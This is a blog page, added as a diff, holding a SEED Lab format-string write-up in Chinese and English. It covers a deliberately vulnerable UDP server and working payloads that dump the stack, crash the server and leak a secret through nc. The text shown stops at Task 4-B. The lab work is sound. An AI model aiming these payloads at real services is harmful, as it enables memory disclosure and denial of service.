@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    Format-String | Simon&#39;s Blog
+  </title>
+  <meta name="description" content="I am the storm.">
+  
+  <meta name="keywords" content="
+  SEED Lab,Format String
+  ">
+  
+  <meta name="author" content="Simon Nie">
+
+  <meta http-equiv="Cache-Control" content="no-transform"/>
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="https://github.githubassets.com/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"
+        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">Google Search</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        
+        <li><a href="/categories">Categories</a></li>
+        
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+        <li class="desktop-only"><a href="/atom.xml" target="_blank">RSS</a></li>
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.jpg"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 23 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 101 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 9 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">Simon&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    Simon Nie
+
+    <span class="post-date float-right" title="{{moment(1579882574000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1579882574000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>Format-String</h1>
+    <p><img src="Format-String/Platform-SEEDUbuntu16__04--32bit-green.svg" alt="">  <img src="Format-String/SEED-SoftwareSecurityLab-brightgreen.svg" alt=""></p>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
+<li><a href="#preparation">Preparation</a><ul>
+<li><a href="#1-什么是格式化字符串">1. 什么是格式化字符串</a></li>
+<li><a href="#2-栈与格式化字符串">2. 栈与格式化字符串</a></li>
+<li><a href="#3-如果参数数量不匹配">3. 如果参数数量不匹配</a></li>
+<li><a href="#4-访问任意位置内存">4. 访问任意位置内存</a></li>
+<li><a href="#5-在内存中写一个数字">5. 在内存中写一个数字</a></li>
+</ul>
+</li>
+<li><a href="#task-1-the-vulnerable-program">Task 1: The Vulnerable Program</a></li>
+<li><a href="#task-2-understanding-the-layout-of-the-stack">Task 2: Understanding the Layout of the Stack</a></li>
+<li><a href="#task-3-crash-the-program">Task 3: Crash the Program</a></li>
+<li><a href="#task-4-print-out-the-server-programs-memory">Task 4: Print Out the Server Program’s Memory</a><ul>
+<li><a href="#task-4-a-stack-data">Task 4-A: Stack Data</a></li>
+<li><a href="#task-4-b-heap-data">Task 4-B: Heap Data</a></li>
+</ul>
+</li>
+<li><a href="#task-5-change-the-server-programs-memory">Task 5: Change the Server Program’s Memory</a><ul>
+<li><a href="#task-5-a-change-the-value-to-a-different-value">Task 5-A: Change the value to a different value</a></li>
+<li><a href="#task-5-b-change-the-value-to-0x500">Task 5-B: Change the value to 0x500</a></li>
+<li><a href="#task-5-c-change-the-value-to-0xff990000">Task 5-C: Change the value to 0xff990000</a></li>
+</ul>
+</li>
+<li><a href="#task-6-inject-malicious-code-into-the-server-program">Task 6: Inject Malicious Code into the Server Program</a></li>
+<li><a href="#task-7-getting-a-reverse-shell">Task 7: Getting a Reverse Shell</a></li>
+<li><a href="#task-8-fix-the-problem">Task 8 Fix the problem</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><h3 id="1-什么是格式化字符串"><a href="#1-什么是格式化字符串" class="headerlink" title="1. 什么是格式化字符串"></a>1. 什么是格式化字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;The magic number is: %d&quot;, 1911);</span><br></pre></td></tr></table></figure>
+
+<p>试观察运行以上语句，会发现字符串”The magic number is: %d”中的格式符％d被参数（1911）替换，因此输出变成了“The magic number is: 1911”。 格式化字符串大致就是这么一回事啦。</p>
+<p>除了表示十进制数的％d，还有不少其他形式的格式符，一起来认识一下吧~</p>
+<table>
+<thead>
+<tr>
+<th align="center">格式符</th>
+<th align="center">含义</th>
+<th align="center">含义（英）</th>
+<th align="center">传</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">%d</td>
+<td align="center">十进制数（int）</td>
+<td align="center">decimal</td>
+<td align="center">值</td>
+</tr>
+<tr>
+<td align="center">%u</td>
+<td align="center">无符号十进制数 (unsigned int)</td>
+<td align="center">unsigned decimal</td>
+<td align="center">值</td>
+</tr>
+<tr>
+<td align="center">%x</td>
+<td align="center">十六进制数 (unsigned int)</td>
+<td align="center">hexadecimal</td>
+<td align="center">值</td>
+</tr>
+<tr>
+<td align="center">%s</td>
+<td align="center">字符串 ((const) (unsigned) char *)</td>
+<td align="center">string</td>
+<td align="center">引用（指针）</td>
+</tr>
+<tr>
+<td align="center">%n</td>
+<td align="center">%n符号以前输入的字符数量 (* int)</td>
+<td align="center">number of bytes written so far</td>
+<td align="center">引用（指针）</td>
+</tr>
+</tbody></table>
+<p>（ * <strong>%n</strong>的使用将在1.5节中做出说明）</p>
+<h3 id="2-栈与格式化字符串"><a href="#2-栈与格式化字符串" class="headerlink" title="2. 栈与格式化字符串"></a>2. 栈与格式化字符串</h3><p>格式化函数的行为由格式化字符串控制，<code>printf</code>函数从栈上取得参数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"a has value %d, b has value %d, c is at address: %08x\n"</span>,a, b, &amp;c);</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://camo.githubusercontent.com/d2f455509a89cc529863576ff47d3468ddb9553c/687474703a2f2f692e696d6775722e636f6d2f67647470567a582e706e67" target="_blank" rel="noopener"><img src="Format-String/687474703a2f2f692e696d6775722e636f6d2f67647470567a582e706e67.png" alt="img"></a></p>
+<h3 id="3-如果参数数量不匹配"><a href="#3-如果参数数量不匹配" class="headerlink" title="3. 如果参数数量不匹配"></a>3. 如果参数数量不匹配</h3><p>会发生什么？ 如果只有一个不匹配会发生什么？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"a has value %d, b has value %d, c is at address: %08x\n"</span>,a, b);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在上面的例子中格式字符串需要3个参数，但程序只提供了2个。</li>
+<li>该程序能够通过编译么？<ul>
+<li><code>printf()</code>是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。</li>
+<li>为了查出不匹配，编译器需要了解<code>printf()</code>的运行机制，然而编译器通常不做这类分析。</li>
+<li>有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。</li>
+</ul>
+</li>
+<li>那么<code>printf()</code>函数自身能检测到不匹配么？<ul>
+<li><code>printf()</code>从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，p<code>rintf()</code>并不知道自己是否会用完提供的所有参数。</li>
+<li>既然没有那样的边界标记。<code>printf()</code>会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。</li>
+</ul>
+</li>
+<li>如果有人特意准备数据让<code>printf()</code>抓取会发生什么呢？</li>
+</ul>
+<h3 id="4-访问任意位置内存"><a href="#4-访问任意位置内存" class="headerlink" title="4. 访问任意位置内存"></a>4. 访问任意位置内存</h3><ul>
+<li>我们需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的只有格式字符串。</li>
+<li>如果我们调用 <code>printf(%s)</code>时没有指明内存地址, 那么目标地址就可以通过<code>printf</code>函数，在栈上的任意位置获取。<code>printf</code>函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置</li>
+<li>观察: 格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> user_input[<span class="number">100</span>];</span><br><span class="line">	... ... <span class="comment">/* other variable definitions and statements */</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line">	<span class="built_in">printf</span>(user_input); <span class="comment">/* Vulnerable place */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>如果我们让<code>printf</code>函数得到格式字符串中的目标内存地址 (该地址也存在于栈上), 我们就可以访问该地址.</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"\x10\x01\x48\x08 %x %x %x %x %s"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>\x10\x01\x48\x08</code> 是<strong>目标地址</strong>的四个字节， 在C语言中, <code>\x10</code>告诉编译器将一个16进制数<code>0x10</code>放于当前位置（占1字节）。如果去掉前缀<code>\x10</code>就相当于两个<code>ascii</code>字符1和0了，这就不是我们所期望的结果了。</p>
+</li>
+<li><p>%x 导致<strong>栈指针向格式字符串的方向移动</strong>（参考第2节）</p>
+</li>
+<li><p>下图解释了攻击方式，如果用户输入中包含了以下格式字符串 <a href="https://camo.githubusercontent.com/3a0ed72413b394a5ec453e069c2d64bfc5d28d60/687474703a2f2f692e696d6775722e636f6d2f67486d534358362e706e67" target="_blank" rel="noopener"><img src="Format-String/687474703a2f2f692e696d6775722e636f6d2f67486d534358362e706e67.png" alt="img"></a></p>
+</li>
+<li><p>如图所示，我们使用四个%x来移动<code>printf</code>函数的栈指针到我们存储格式字符串的位置，一旦到了目标位置，我们使用％s来打印，它会打印位于地址<code>0x10014808</code>的内容，因为是将其作为字符串来处理，所以会一直打印到结束符为止。</p>
+</li>
+<li><p>user_input数组到传给<code>printf</code>函数参数的地址之间的栈空间不是为了<code>printf</code>函数准备的。但是，因为程序本身存在格式字符串漏洞，所以<code>printf</code>会把这段内存当作传入的参数来匹配％x。</p>
+</li>
+<li><p>最大的挑战就是想方设法找出<code>printf</code>函数栈指针(函数取参地址)到user_input数组的这一段距离是多少，这段距离决定了你需要在%s之前输入多少个%x。</p>
+</li>
+</ul>
+<h3 id="5-在内存中写一个数字"><a href="#5-在内存中写一个数字" class="headerlink" title="5. 在内存中写一个数字"></a>5. 在内存中写一个数字</h3><p> <strong>%n: 该符号前输入的字符数量会被存储到对应的参数中去</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">"12345%n"</span>, &amp;i);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>数字5（<strong>%n前的字符数量</strong>）将会被写入i 中</li>
+<li>运用同样的方法在访问任意地址内存的时候，我们可以将一个数字写入指定的内存中。只要将上一小节(1.4)的%s替换成%n就能够覆盖<code>0x10014808</code>的内容。</li>
+<li>利用这个方法，攻击者可以做以下事情:<ul>
+<li>重写程序标识控制访问权限</li>
+<li>重写栈或者函数等等的返回地址</li>
+</ul>
+</li>
+<li>然而，写入的值是由%n之前的字符数量决定的。真的有办法能够写入任意数值么？<ul>
+<li>用最古老的计数方式， 为了写1000，就填充1000个字符吧。</li>
+<li>为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0数字x）就会左填充预期数量的0符号)</li>
+</ul>
+</li>
+</ul>
+<h2 id="Task-1-The-Vulnerable-Program"><a href="#Task-1-The-Vulnerable-Program" class="headerlink" title="Task 1: The Vulnerable Program"></a>Task 1: The Vulnerable Program</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
+
+<p>Download program <code>server.c</code> and compile it.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 9090</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">"A secret message\n"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  target = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The address of the 'msg' argument: 0x%.8x\n"</span>, (<span class="keyword">unsigned</span>) &amp;msg);</span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of the 'target' variable (after): 0x%.8x\n"</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function provides some helpful information. It is meant to</span></span><br><span class="line"><span class="comment">//   simplify the lab task. In practice, attackers need to figure</span></span><br><span class="line"><span class="comment">//   out the information by themselves.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">helper</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The address of the secret: 0x%.8x\n"</span>, (<span class="keyword">unsigned</span>) secret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The address of the 'target' variable: 0x%.8x\n"</span>, </span><br><span class="line">            (<span class="keyword">unsigned</span>) &amp;target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The value of the 'target' variable (before): 0x%.8x\n"</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></span><br><span class="line">    <span class="keyword">int</span> clientLen;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1500</span>];</span><br><span class="line">    helper();</span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span> *) &amp;server, <span class="number">0</span>, <span class="keyword">sizeof</span>(server));</span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    server.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock, (struct sockaddr *) &amp;server, <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">"ERROR on binding"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        bzero(buf, <span class="number">1500</span>);</span><br><span class="line">        recvfrom(sock, buf, <span class="number">1500</span><span class="number">-1</span>, <span class="number">0</span>,</span><br><span class="line">                 (struct sockaddr *) &amp;client, &amp;clientLen);</span><br><span class="line">        myprintf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>use command below:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -o server server.c</span><br><span class="line">server.c: In function myprintf:</span><br><span class="line">server.c:13:5: warning: format not a string literal and no format arguments[-Wformat-security]printf(msg);</span><br><span class="line">	ˆ</span><br></pre></td></tr></table></figure>
+
+<p>Ignore the warning.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> on the server VM</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> On the client VM</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 10.0.2.5 9090(use 127.0.0.1 to substitute 10.0.2.5 <span class="keyword">in</span> the same VM)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Then you will find what you input in client will be output in server VM.</strong></p>
+<h2 id="Task-2-Understanding-the-Layout-of-the-Stack"><a href="#Task-2-Understanding-the-Layout-of-the-Stack" class="headerlink" title="Task 2: Understanding the Layout of the Stack"></a>Task 2: Understanding the Layout of the Stack</h2><p><img src="Format-String/Screenshot%20from%202019-11-15%2021-10-21.png" alt=""></p>
+<p>Observe the assembly code of <code>server</code> to find the return address of <code>myprintf()</code>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d server&gt;server.out</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="Format-String/Screenshot%20from%202019-11-15%2008-13-44.png" alt=""></p>
+<p>This is assembly part of main, we can find the return address of <code>myprintf()</code> is <code>0x0804872d</code>.</p>
+<p>Then we need to find <strong>where the return address is stored in stack</strong>.</p>
+<p>We can use <code>%p</code> to print the stack, or we can use <code>%.8x</code> instead.</p>
+<p>When inputing <code>%p</code> in client VM, it shows <code>0xbf9dfa10</code>, and when using <code>%.8x</code> it shows <code>bf9dfa10</code>. Both make sense.</p>
+<p>So we use:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|</span></span><br></pre></td></tr></table></figure>
+
+<p>Then we got:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[11/21/19]seed@VM:~/.../formatString$ sudo ./server </span><br><span class="line">The address of the secret: 0x080487c0</span><br><span class="line">The address of the 'target' variable: 0x0804a040</span><br><span class="line">The value of the 'target' variable (before): 0x11223344</span><br><span class="line">The address of the 'msg' argument: 0xbffff0a0</span><br><span class="line">0xbffff0a0|0xb7fba000|0x804871b|0x3|0xbffff0e0|0xbffff6c8|0x804872d|0xbffff0e0|0xbffff0b8|0x10|0x804864c|0xb7e1b2cd|0xb7fdb629|0x10|0x3|0x82230002|(nil)|(nil)|(nil)|0x940002|0x1|0xb7fff000|0xb7fff020|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|</span><br></pre></td></tr></table></figure>
+
+<p>We can find that:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(stack top)</span><br><span class="line">|format str|</span><br><span class="line">|0xbffff0a0| the address of msg</span><br><span class="line">|0xb7fba000|</span><br><span class="line">...</span><br><span class="line">|0x0804872d| the return address of myprintf</span><br><span class="line">|0xbffff0e0| the value of msg</span><br><span class="line">...</span><br><span class="line">(stack base)</span><br></pre></td></tr></table></figure>
+
+<p>The distance between format string and the value of <code>msg</code> is $8*4=32\ bytes$. And we got the address of <code>msg</code> is <code>0xbffff0a0</code>, the value of <code>msg</code> is <code>0xbffff0e0</code>. The we got the address of format string is <code>0xbffff0a0</code> - 32 = <code>0xbffff080</code>.</p>
+<p>So, </p>
+<ul>
+<li><p>Question 1: What are the memory addresses at the locations marked by ➊, ➋, and ➌? </p>
+<ol>
+<li><p>The address of format string is <code>0xbffff080</code>;</p>
+</li>
+<li><p>The address of return address of <code>myprintf()</code> is <code>0xbffff0a0 - 4 = 0xbffff09c</code></p>
+</li>
+<li><p>The address of buff is <code>0xbffff0e0</code>(input value is the address of buff);</p>
+</li>
+</ol>
+</li>
+<li><p>Question 2: What is the distance between the locations marked by ➊ and ➌?</p>
+<p>  The distance between 1 and 3 is <code>0x080-0x0e0=0x60=96 bytes</code>.</p>
+</li>
+</ul>
+<h2 id="Task-3-Crash-the-Program"><a href="#Task-3-Crash-the-Program" class="headerlink" title="Task 3: Crash the Program"></a>Task 3: Crash the Program</h2><p>To crash the program, we have some tricks.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%08x.%08x.%08x 打印的是接下来几个地址对应的地址</span><br><span class="line">%3$x 获取第三个参数利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</span><br><span class="line">利用 %s 来获取变量所对应地址的内容，只不过有零截断。</span><br><span class="line">利用 %order$x 来获取指定参数的值，</span><br><span class="line">利用 %order$s 来获取指定参数对应地址的内容。</span><br></pre></td></tr></table></figure>
+
+<p>So we have noticed that there is a <code>0x3</code> in the stack, if we try to read it as address, it will crash the program.</p>
+<p>type in the client VM:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>
+
+<p>We made it.</p>
+<h2 id="Task-4-Print-Out-the-Server-Program’s-Memory"><a href="#Task-4-Print-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 4: Print Out the Server Program’s Memory"></a>Task 4: Print Out the Server Program’s Memory</h2><h3 id="Task-4-A-Stack-Data"><a href="#Task-4-A-Stack-Data" class="headerlink" title="Task 4-A: Stack Data"></a>Task 4-A: Stack Data</h3><p>To print out the stack data, just type in <code>%.8x</code> or <code>%p</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|%<span class="number">.8</span>x|</span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-4-B-Heap-Data"><a href="#Task-4-B-Heap-Data" class="headerlink" title="Task 4-B: Heap Data"></a>Task 4-B: Heap Data</h3><p>To print out the value of the secret <code>msg</code>, we need construct a payload use python. Since we already own its address, it’s easy to do so. *<em>From above questions we have find the distance between stack pointer and buffer array is 96 bytes. We use 23 %p to move the stack pointer from its current position to the buffer array where stores our input(the address of secret message). The the 24-th one, the ‘%s’ indicates the <code>printf()</code> function should print the content in the array as an address. So it will find the value in that address. *</em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\xc0\x87\x04\x08"</span>)%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s | nc 127.0.0.1 9090</span></span><br><span class="line">// Or we can save the data in a file</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\xc0\x87\x04\x08"</span>)%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s &gt; input</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc 127.0.0.1 9090 &lt; input</span></span><br></pre></td></tr></table></figure>
+
+<p>Note that most computers are small-endian machines.</p>
